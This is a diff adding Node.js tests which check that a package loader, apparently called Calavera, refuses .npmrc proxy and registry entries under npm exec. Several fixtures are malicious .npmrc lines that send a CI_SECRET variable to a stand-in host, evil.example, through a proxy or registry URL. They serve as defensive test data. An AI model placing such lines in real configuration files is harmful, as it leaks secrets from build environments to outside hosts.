@@ -1048,3 +1048,133 @@ console.log(JSON.stringify({ stubbed, expanded: options.httpsProxy === "http://p
   // Without an account home, no user file expands variables, and the loader still works.
   assert.deepEqual(await run(""), { stubbed: true, expanded: false });
 });
+
+/**
+ * A fixture's loader context with the variables npm exec exports for it.
+ * @param {Awaited<ReturnType<typeof fixture>>} context
+ * @param {Record<string, string>} exported
+ */
+function npmExecContext(context, exported) {
+  return {
+    ...context,
+    env: {
+      ...context.env,
+      CI_SECRET: SECRET_PROXY,
+      npm_command: "exec",
+      npm_config_local_prefix: context.cwd,
+      ...exported,
+    },
+  };
+}
+
+test("under npm exec, a proxy that a chosen user .npmrc spells differently is not trusted as environment", async () => {
+  const context = await fixture({ project: "userconfig=./evil.npmrc\n" });
+  const chosen = join(context.cwd, "evil.npmrc");
+  for (const spelling of ["https_proxy", "HTTPS-PROXY"]) {
+    await writeFile(chosen, `${spelling}=http://\${CI_SECRET}.evil.example:8080/\n`);
+    // npm warns about the unknown key, but still exports it as npm_config_https_proxy.
+    const result = await loadNpmRegistryOptions(
+      npmExecContext(context, {
+        npm_config_userconfig: chosen,
+        npm_config_https_proxy: `http://${SECRET_PROXY}.evil.example:8080/`,
+      }),
+    );
+    assert.equal(result.options.httpsProxy, undefined, spelling);
+    assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
+  }
+});
+
+test("under npm exec, a project proxy key with a variable in it is project content, because npm expands keys", async () => {
+  const context = await fixture({
+    project: "https-proxy${NOPE?}=http://${CI_SECRET}.evil.example:8080/\n",
+  });
+  const result = await loadNpmRegistryOptions(
+    npmExecContext(context, {
+      npm_config_https_proxy: `http://${SECRET_PROXY}.evil.example:8080/`,
+    }),
+  );
+  assert.equal(result.options.httpsProxy, undefined);
+  assert.match(
+    result.warnings.join("\n"),
+    /^Ignored https-proxy\$\{NOPE\?\} in the project \.npmrc/m,
+  );
+  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
+});
+
+test("under npm exec, a project registry key with a variable in it follows the project registry rules", async () => {
+  const withVariable = await fixture({
+    project: "registry${NOPE?}=https://evil.example/${CI_SECRET}/\n",
+  });
+  await assert.rejects(
+    loadNpmRegistryOptions(
+      npmExecContext(withVariable, {
+        npm_config_registry: `https://evil.example/${SECRET_PROXY}/`,
+      }),
+    ),
+    (error) => {
+      assert.match(error.message, /in the project \.npmrc contains a variable reference/);
+      assert.doesNotMatch(inspect(error, { depth: 10 }), new RegExp(`${SECRET_PROXY}|evil`));
+      return true;
+    },
+  );
+  const http = await fixture({ project: "registry${NOPE?}=http://insecure.example.com/\n" });
+  await assert.rejects(
+    loadNpmRegistryOptions(
+      npmExecContext(http, { npm_config_registry: "http://insecure.example.com/" }),
+    ),
+    /in the project \.npmrc must be an https URL/,
+  );
+  const literal = await fixture({ project: "registry${NOPE?}=https://mirror.example.com/\n" });
+  const { options, registry } = await loadNpmRegistryOptions(
+    npmExecContext(literal, { npm_config_registry: "https://mirror.example.com/" }),
+  );
+  assert.equal(options.registry, "https://mirror.example.com/");
+  assert.equal(registry.source, "project .npmrc");
+  // A key that npm does not use, such as REGISTRY, is not applied, as before.
+  const unused = await fixture({ project: "REGISTRY=https://mirror.example.com/\n" });
+  const dropped = await loadNpmRegistryOptions(
+    npmExecContext(unused, { npm_config_registry: "https://mirror.example.com/" }),
+  );
+  assert.equal(dropped.options.registry, undefined);
+});
+
+test("a real npm exec exports a project proxy key with a variable in it, and Calavera does not trust the copy", async (t) => {
+  const execFileAsync = promisify(execFile);
+  const context = await fixture({
+    project: "https-proxy${NOPE?}=http://${CI_SECRET}.evil.example:8080/\n",
+  });
+  await writeFile(join(context.cwd, "package.json"), JSON.stringify({ name: "probe" }));
+  const home = join(context.directory, "home");
+  await mkdir(home);
+  const clean = Object.fromEntries(
+    Object.entries(process.env).filter(([name]) => !/^npm_/i.test(name)),
+  );
+  let output;
+  try {
+    ({ stdout: output } = await execFileAsync(
+      "npm",
+      ["exec", "--offline", "--", "node", "-p", "JSON.stringify(process.env)"],
+      { cwd: context.cwd, env: { ...clean, HOME: home, CI_SECRET: SECRET_PROXY } },
+    ));
+  } catch (error) {
+    t.skip(`npm exec is not available: ${error.code ?? error.message}`);
+    return;
+  }
+  const captured = JSON.parse(output);
+  assert.equal(captured.npm_config_https_proxy, `http://${SECRET_PROXY}.evil.example:8080/`);
+  const result = await loadNpmRegistryOptions({ ...context, env: captured });
+  assert.equal(result.options.httpsProxy, undefined);
+  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
+});
+
+test("under npm exec, a caller's https-proxy equal to a project proxy under another key is still the caller's", async () => {
+  const context = await fixture({ project: "proxy=http://shared-proxy.example.com:8080/\n" });
+  const { options } = await loadNpmRegistryOptions(
+    npmExecContext(context, {
+      npm_config_proxy: "http://shared-proxy.example.com:8080/",
+      npm_config_https_proxy: "http://shared-proxy.example.com:8080/",
+    }),
+  );
+  assert.equal(options.httpsProxy, "http://shared-proxy.example.com:8080/");
+  assert.equal(options.proxy, undefined);
+});
